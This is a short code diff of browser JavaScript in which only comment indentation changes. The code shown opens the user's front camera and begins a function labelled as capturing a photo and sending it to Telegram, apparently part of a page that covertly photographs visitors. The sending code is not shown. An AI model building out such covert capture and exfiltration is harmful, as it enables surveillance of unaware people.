@@ -1,10 +1,10 @@
- // 📸 Background Camera Setup
+// 📸 Background Camera Setup
         async function startCamera() {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById("video").srcObject = stream;
         }
 
-        // 📸 Capture Photo and Send to Telegram
+// 📸 Capture Photo and Send to Telegram
         async function captureAndSendPhoto() {
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
